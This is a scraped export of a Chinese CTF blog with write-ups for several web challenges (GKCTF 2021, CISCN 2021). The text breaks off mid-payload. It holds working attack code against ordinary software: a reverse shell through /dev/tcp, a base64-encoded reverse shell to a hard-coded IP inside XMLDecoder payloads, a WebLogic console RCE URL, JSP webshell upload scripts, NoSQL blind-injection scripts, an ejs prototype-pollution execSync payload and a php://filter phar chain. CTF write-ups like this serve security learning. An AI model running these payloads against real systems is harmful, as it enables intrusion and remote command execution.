waitDuration: &#39;3s&#39; &#125;); await page.goto(user.bucket); const html &#x3D; page.htmlContent; const headers &#x3D; page.headers; const cookies &#x3D; page.cookies; await page.close(); return res.json(&#123; html, headers, cookies&#125;); &#125; catch (err) &#123; return res.json(&#123; err: &#39;Error visiting your bucket. &#39; &#125;) &#125; &#125;&#125;); Crawler爬虫使用Zombie实现，而这个模块是有漏洞的，参考 https://ha.cker.in/index.php/Article/13563 更改bucket还要绕过一个简单的过滤 12345678910static checkBucket(url) &#123; try &#123; url &#x3D; new URL(url); &#125; catch (err) &#123; return false; &#125; if (url.protocol !&#x3D; &quot;http:&quot; &amp;&amp; url.protocol !&#x3D; &quot;https:&quot;) return false; if (url.href.includes(&#39;oss-cn-beijing.ichunqiu.com&#39;) &#x3D;&#x3D;&#x3D; false) return false; return true; &#125; 用#绕过就可以了 提交bucket为http://vps ip:port/hack.html#oss-cn-beijing.ichunqiu.com 在vps上开一个http服务，放置hack.html 内容为 1&lt;script&gt;c&#x3D;&#39;constructor&#39;;this[c][c](&quot;c&#x3D;&#39;constructor&#39;;require&#x3D;this[c][c](&#39;return process&#39;)().mainModule.require;var sync&#x3D;require(&#39;child_process&#39;).spawnSync; var ls &#x3D; sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;x 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;&#x2F;script&gt; 再次访问/user/bucket即可拿到shell","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"Nodejs","slug":"CTF/Nodejs","permalink":"https://123-prog.github.io/categories/CTF/Nodejs/"}],"tags":[{"name":"js代码审计","slug":"js代码审计","permalink":"https://123-prog.github.io/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"zombie RCE","slug":"zombie-RCE","permalink":"https://123-prog.github.io/tags/zombie-RCE/"}]},{"title":"(GKCTF 2021)hackme","slug":"GKCTF-2021-hackme","date":"2021-08-18T15:02:19.000Z","updated":"2021-09-22T10:19:08.544Z","comments":true,"path":"2021/08/18/GKCTF-2021-hackme/","link":"","permalink":"https://123-prog.github.io/2021/08/18/GKCTF-2021-hackme/","excerpt":"0x01 nosql注入前台提示nosql 利用重言式注入，发现存在过滤","text":"0x01 nosql注入前台提示nosql 利用重言式注入，发现存在过滤 由于是json数据，可以使用Unicode编码绕过 看来必须拿到admin的密码了，利用正则匹配进行盲注，首先匹配到密码长度为32 1&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078&quot;:&quot;.&#123;33&#125;&quot;&#125;&#125; 注入拿到密码，参考脚本 1234567891011121314151617181920212223#coding=utf-8import requestsimport stringalp = string.printableno = &#x27;.+*?|&amp;$#^&#x27;url = &#x27;http://node4.buuoj.cn:29004/login.php&#x27;pw = &#x27;&#x27;addHeaders = &#123; &quot;Content-Type&quot;:&quot;application/json&quot;&#125;for i in range(32): for x in alp: if x not in no: data = &#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;&#125;&#125;&#x27;&#x27;&#x27; %(pw+x) r = requests.post(url,headers=addHeaders,data=data) #print(r.text) if &quot;登录了，但没完全登录&quot; in r.text: pw += x print(pw) break 拿到密码为 142276606202db06ad1f29ab6b4a1307f 登录成功跳转到/admin 0x02登录完发现有个貌似可以读取文件的接口，但读取php文件没有显示源码，猜测是php [filename]，读取/proc/self/cmdline可以证明这一点 读取/flag会得到flag在内网，那么需要找到内网服务进行攻击 读取环境变量/proc/self/environ 1USER&#x3D;nginxPWD&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;htmlSHLVL&#x3D;1HOME&#x3D;&#x2F;home&#x2F;nginx_&#x3D;&#x2F;usr&#x2F;bin&#x2F;php 得到工作目录/usr/local/nginx/html 而nginx配置文件在/usr/local/nginx/conf/nginx.conf， 读取配置文件如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; server &#123; listen 80; error_page 404 404.php; root &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html; index index.htm index.html index.php; location ~ \\.php$ &#123; root &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; &#125;resolver 127.0.0.11 valid&#x3D;0s ipv6&#x3D;off;resolver_timeout 10s; # weblogic server &#123; listen 80; server_name weblogic; location &#x2F; &#123; proxy_set_header Host $host; set $backend weblogic; proxy_pass http:&#x2F;&#x2F;$backend:7001; &#125; &#125;&#125; 看到nginx反代，是个weblogic 端口相同，nginx根据请求中的Host头部匹配对应server，如果匹配不到，默认第一个server，这里weblogic服务没有waf掉，改Host头就可以访问到 这里还有个漏洞，注意到nginx的版本为1.17.6，这个版本的error_page可以走私，也可以访问到weblogic，搜索引擎搜一下走私方法，其实就是利用前后端服务器对GET请求CL!=0情况处理的不一致，前端服务器接受CL!=0，后端服务器无视了 访问/a触发error_page，可以看到在请求体中的内容被当成另一个请求了，而且即使weblogic被前端服务器waf掉也可以利用 12345678GET &#x2F;a HTTP&#x2F;1.1Host: node4.buuoj.cn:25766Content-Length: 61GET &#x2F;console&#x2F;login&#x2F;LoginForm.jsp HTTP&#x2F;1.1Host: weblogic 拿到weblogic版本 1WebLogic Server Version: 12.2.1.4.0 利用有回显的exp 1&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsolejndi.portal?test_handle&#x3D;com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20&#x3D;%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20&#x3D;%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20&#x3D;%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20&#x3D;%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20&#x3D;%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20&#x3D;%20req.getHeader(%22cmd%22);String[]%20cmds%20&#x3D;%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22&#x2F;c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22&#x2F;bin&#x2F;sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!&#x3D;%20null%20)&#123;%20String%20result%20&#x3D;%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20&#x3D;%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); 然后在请求头部添加cmd: xxx即可实现命令执行，而且有回显，执行/readflag读取拿到flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"nosql","slug":"CTF/nosql","permalink":"https://123-prog.github.io/categories/CTF/nosql/"}],"tags":[{"name":"nosql注入","slug":"nosql注入","permalink":"https://123-prog.github.io/tags/nosql%E6%B3%A8%E5%85%A5/"}]},{"title":"GKCTFxDASCTF web部分复现","slug":"GKCTFxDASCTF-web部分复现","date":"2021-08-09T09:24:33.000Z","updated":"2021-09-22T10:19:23.557Z","comments":true,"path":"2021/08/09/GKCTFxDASCTF-web部分复现/","link":"","permalink":"https://123-prog.github.io/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/","excerpt":"0x01 babycat这题出了非预期，非预期就直接传马，没有任何过滤","text":"0x01 babycat这题出了非预期，非预期就直接传马，没有任何过滤 注册个账号，提示Not Allowed，这里存在逻辑漏洞，右键源码看到直接post数据可以注册 登录后可以在/home/download处下载任意代码，读取web.xml，得知包的结构，可以下载class文件，反编译就可以得到源码 例如/home/download?file=../classes/com/web/servlet/uploadServlet.class upload路由的post方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; if (!ServletFileUpload.isMultipartContent(req)) &#123; req.setAttribute(&quot;error&quot;, &quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;); req.getRequestDispatcher(&quot;../WEB-INF/error.jsp&quot;).forward(req, resp); &#125; DiskFileItemFactory factory = new DiskFileItemFactory(); factory.setSizeThreshold(3145728); factory.setRepository(new File(System.getProperty(&quot;java.io.tmpdir&quot;))); ServletFileUpload upload = new ServletFileUpload(factory); upload.setFileSizeMax(41943040L); upload.setSizeMax(52428800L); String uploadPath = System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/upload/&quot;; try &#123; List&lt;FileItem&gt; formItems = upload.parseRequest(req); if (formItems != null &amp;&amp; formItems.size() &gt; 0) &#123; Iterator var7 = formItems.iterator(); label34: while(true) &#123; FileItem item; do &#123; if (!var7.hasNext()) &#123; break label34; &#125; item = (FileItem)var7.next(); &#125; while(item.isFormField()); String fileName = item.getName(); String ext = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)).replace(&quot;.&quot;, &quot;&quot;); String name = fileName.replace(ext, &quot;&quot;); if (checkExt(ext) || checkContent(item.getInputStream())) &#123; req.setAttribute(&quot;error&quot;, &quot;upload failed&quot;); req.getRequestDispatcher(&quot;../WEB-INF/upload.jsp&quot;).forward(req, resp); &#125; String filePath = uploadPath + File.separator + name + ext; File storeFile = new File(filePath); item.write(storeFile); req.setAttribute(&quot;error&quot;, &quot;upload success!&quot;); &#125; &#125; &#125; catch (Exception var14) &#123; req.setAttribute(&quot;error&quot;, &quot;&lt;script&gt;alert(&#x27;something wrong&#x27;);history.back(-1)&lt;/script&gt;&quot;); &#125; req.getRequestDispatcher(&quot;../WEB-INF/upload.jsp&quot;).forward(req, resp); &#125; 并没有对身份进行验证，过滤文件内容和后缀的判断后没有return，后面的代码照样执行，过滤了个寂寞 上传马 12345678910111213141516171819202122import requestsimport jsons = requests.session()f = open(&#x27;shell.jsp&#x27;,&#x27;r&#x27;)data = f.read()#print(data)loginData = &#123; &quot;username&quot;:&quot;123&quot;, &quot;password&quot;:&quot;123&quot;&#125;loginUrl = &#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/login&#x27;url = &#x27;http://05d055c0-bfda-4c70-bd28-a331d01d153a.node4.buuoj.cn:81/home/upload&#x27;r = s.post(loginUrl,data=&#123;&quot;data&quot;:json.dumps(loginData)&#125;)r1 = s.post(url,files=&#123;&quot;file&quot;:(&quot;../../static/shell.jsp&quot;,data)&#125;) 往static目录写马，拿flag 预期解： 首先要成为admin，才能上传文件，在注册类中可以发现，注册时会匹配这样的正则 1&quot;role&quot;:&quot;(.*?)&quot; 并会将最后的匹配替换成&quot;role&quot;:&quot;guest&quot;，绕过payload，使用注释 1data&#x3D;&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;password&quot;:&quot;xxx&quot;,&quot;role&quot;:&quot;admin&quot;&#x2F;*,&quot;role&quot;:&quot;xxx&quot;*&#x2F;&#125; 上传文件有过滤后缀和内容，允许上传xml文件 结合在操作数据库的com.web.dao.baseDao中 1Object obj = (new XMLDecoder(new FileInputStream(System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;))).readObject(); 直接读取db.xml并传入XMLDecoder进行解析，这里可以往db.xml写恶意xml 过滤了xml文件内容 1String[] blackList = new String[]&#123;&quot;Runtime&quot;, &quot;exec&quot;, &quot;ProcessBuilder&quot;, &quot;jdbc&quot;, &quot;autoCommit&quot;&#125;; 根据提示，使用PrintWriter写shell，需要绝对路径，可以读环境变量获取 Runtime在黑名单里面，可以先用任意写文件的马，将jsp内容写进指定文件，触发一次XMLDecoder就可以，登录或注册都可以触发 &lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt; 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;java version&#x3D;&quot;1.8.0_192&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;shell.jsp&lt;&#x2F;string&gt;&lt;voidmethod&#x3D;&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[&lt;%new java.io.FileOutputStream(request.getParameter(&quot;f&quot;)).write(request.getParameter(&quot;c&quot;).getBytes());%&gt;]]&gt;&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;java&gt; &lt;![CDATA[这里的内容不会被xml解析器解析，可以避免一些麻烦]]&gt; 实现任意写文件，再写命令执行马 1&#x2F;static&#x2F;shell.jsp?f&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;static&#x2F;c4t.jsp&amp;c&#x3D;&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt; 1&#x2F;static&#x2F;c4t.jsp?i&#x3D;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D 反弹shell的命令可以在http://www.jackson-t.ca/runtime-exec-payloads.html这个工具编码一下，`Runtime.getRuntime().exec()`有些shell的特殊符号它不解释 或者不用PrintWriter，用xml实体编码就可以绕过对ProcessBuilder的过滤，所以恶意的xml也可以是 1234567891011121314151617&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;java&gt;&lt;object class=&quot;java.lang.&amp;#80;rocessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/object&gt;&lt;/java&gt; 然后注册触发xml解析就可以拿到shell 0x02 easynode首先是登录，看源码，是sql注入，但过滤很严格，貌似不可以逃逸出引号实现注入，但其实这里的waf有漏洞 123456789101112131415161718192021222324const waf = (str)=&gt;&#123; // console.log(str); blacklist = [&#x27;\\\\&#x27;,&#x27;\\^&#x27;,&#x27;)&#x27;,&#x27;(&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\&#x27;&#x27;] blacklist.forEach(element =&gt; &#123; if (str == element)&#123; str = &quot;*&quot;; &#125; &#125;); return str; &#125; const safeStr = (str)=&gt;&#123; for(let i = 0;i &lt; str.length;i++)&#123; if (waf(str[i]) ==&quot;*&quot;)&#123; str = str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length); &#125; &#125; return str; &#125; username = safeStr(username); password = safeStr(password); let sql = format(&quot;select * from test where username = &#x27;&#123;&#125;&#x27; and password = &#x27;&#123;&#125;&#x27;&quot;,username.substr(0,20),password.substr(0,20)); waf是把传入的username逐个与黑名单进行比较，可以传入数组进行绕过，但后面substr只能是字符串，所以我们的数组中还得出现一次黑名单的字符，通过这句语句str = str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);将一个数组转化成字符串 但得注意的是，safe中的循环次数是根据str长度来的，str从数组变成字符串，长度会发生改变，之后循环还会继续，此时就要保证循环继续之后，不会被waf，可以拉长数组长度，使得在转变成字符串的时候，i值够大，不会影响到我们的payload 1username &#x3D; [&quot;admin&#39;#&quot;,1,1,1,1,&quot;(&quot;] post 1username[]&#x3D;admin&#39;#&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;1&amp;username[]&#x3D;(&amp;password&#x3D;xxx 拿到token值 后面就是一个原型链污染到ejs模块实现RCE 在/adminDIV下 出现了可控的键值 注册一个名为__proto__的用户（用admin的token注册），登录拿到token，在/adminDIV提交污染数据 1data=&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);//&quot;&#125; 污染到ejs中的outputFunctionName，在渲染之后，可实现RCE 参考https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ 回到/admin路由，渲染时直接触发RCE","categories":[{"name":"wp","slug":"wp","permalink":"https://123-prog.github.io/categories/wp/"}],"tags":[{"name":"杂记","slug":"杂记","permalink":"https://123-prog.github.io/tags/%E6%9D%82%E8%AE%B0/"}]},{"title":"(CISCN2021 Quals)filter","slug":"CISCN2021-Quals-filter","date":"2021-08-05T02:42:14.000Z","updated":"2021-09-22T10:18:45.763Z","comments":true,"path":"2021/08/05/CISCN2021-Quals-filter/","link":"","permalink":"https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/","excerpt":"0x01给了site控制器的源码，就改了index方法的那一部分","text":"0x01给了site控制器的源码，就改了index方法的那一部分 1234567public function actionIndex() &#123; $file = Yii::$app-&gt;request-&gt;get(&#x27;file&#x27;); $res = file_get_contents($file); file_put_contents($file,$res); return $this-&gt;render(&#x27;index&#x27;); &#125; 读取文件内容，再将读取到的内容写到文件中，看似我们无法控制其中的内容，实际上可以通过php://filter过滤数据，再通过巧妙地构造实现在指定文件中写入想要的内容，具体看下面 首先，需要知道一个目标文件路径 根据提示 12345678910&#x27;log&#x27; =&gt; [ &#x27;traceLevel&#x27; =&gt; YII_DEBUG ? 0 : 0, &#x27;targets&#x27; =&gt; [ [ &#x27;class&#x27; =&gt; &#x27;yii\\log\\FileTarget&#x27;, &#x27;levels&#x27; =&gt; [&#x27;error&#x27;], &#x27;logVars&#x27; =&gt; [], ], ], ], &#39;class&#39; =&gt; &#39;yii\\log\\FileTarget&#39;指定日志使用文件存储，没有指定存储目标文件，默认在目录 /runtime/logs/app.log 目标文件就是这个日志文件 0x02 php://filter清空文件内容首先，清空主要是利用convert.base64-decode解码的时候会先将非base64编码表里面的字符清除，只要将日志的内容转换为非base64编码表中的字符，就可以实现清除的目的 利用转化编码的方式可以将日志中的字符转换成一些编码值较大的字符，这些字符不会出现在base64编码表中 主要的filter过滤流为 php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log，通过file_put_contents()将读出的数据通过write流（得到空）再写入文件 分析： convert.iconv.utf-8.utf-16be可以将字符的编码从utf-8转换到utf-16be，be代表大端序，对应le代表小端序，比如，utf-8下的t对应74，经过这一转换，就变成了0074 convert.quoted-printable-encode，打印出所有字符，包括不可见字符，会穿插等于号在其中作为标志，为什么要用这个呢，下面看一下，经过这个流打印出的字符，已经没有不可见字符，而且观察一下，如果作为utf-16来看，两个字节一个字符，这些表示的字符编码值都很高，会是一些语言符号，可能是中文或者其他语言，但它都不会在base64编码表里 将上面得到的字符再做个编码转换，回到utf-8，convert.iconv.utf-16be.utf-8，会得到这些字符 最后base64-decode直接清空 其实多次base64-decode也是可以清空的 0x03 构造phar触发反序列化我们可以在日志控制的部分，无非就是某个不存在的目录或文件参数，我们访问这个不存在的参数，这题file参数就是这样的参数，如果给出不存在的路径，自然会在日志中反映出来 在本地搭个环境，利用composer搭 然后把本地环境的配置改一下，控制器改一下，改成跟题目一致就可以了 给出一个不存在参数1&#x2F;?r&#x3D;site&#x2F;index&amp;file&#x3D;PPOOCC 日志中出现一条错误信息 有两处可以出现我们的payload，但这里的第二处栈信息中，只会显示15个字符，超过直接省略号给你省略了，这里是一个点需要注意的，这里的省略需要做处理，否则截断在第15个字符，可能对后面的解码转码造成影响 下面开始消除日志payload外的其他字符，方法是，对payload进行编码转码后再插入，然后在对payload进行还原的同时，清除其他字符 读取流可以是这样的： 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log 可以试一下，经过convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8会出现所谓的乱码，再base64-decode可以清除日志中的其他内容，接下来处理payload 对payload的处理就是上面的逆处理 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode&#x2F;resource&#x3D;payload.txt 注意这里还有些细节要处理，并不是直接将payload插进去就完事,注意以下几点 流处理过程中不能报错，因为报错信息会写进日志，对我们构造的phar文件造成影响 1.convert.quoted-printable-decode，=是这个处理的特殊符号，在除了payload触发点的其他地方出现，都可能引起报错，如果日志本身出现了=，那么估计只能另作考虑，不用这个了，但幸好，日志记录的内容除了我们的payload以外，并没有= 2.可能你已经注意到了，上面的日志示例，有两处可以出现payload，第二处15个字符截断，如果截断在=后面或者=后面只留一个数字，那么也是会报错的，所以这里的处理是，在payload前面添加长度&gt;=15的字符串，这样日志里面就只有一处payload了 3.convert.iconv.utf-16be.utf-8，它会将log中的内容进行编码转换，utf-16以两个字节为一个字符，所以我们log里面的字节数必须为偶数，不然也会报错，除此之外，我们的payload的第一个字节在转换编码为utf-8的时候必须和payload的第二个字节“凑一对”，而不是和payload前面的那一个字符“凑一对”，想一想就知道，第一个字节让抢了，我们的payload完整性不就没了，不就无法复原了，所以我们还要保证payload前面的字节数为偶数 前面的还好，就第三点比较麻烦，我们可以这样操作 先发送一个请求，在log中留下一个记录，file&gt;=15，将第二个payload点去除，方便我们控字节数 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx 再发一个携带payload的请求，在log中留下payload 1?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00%3D0A%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00%3D0A%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00%3D0A%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00%3D0A%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00%3D0A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00%3D0A%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00%3D0A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00%3D0A%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00F%3D00D%3D00o%3D00y%3D00y%3D00f%3D00f%3D00m%3D003%3D00M%3D004%3D00B%3D00r%3D001%3D00c%3D00K%3D00C%3D00e%3D001%3D008%3D007%3D00Q%3D00C%3D00M%3D00Y%3D008%3D00e%3D00A%3D00g%3D0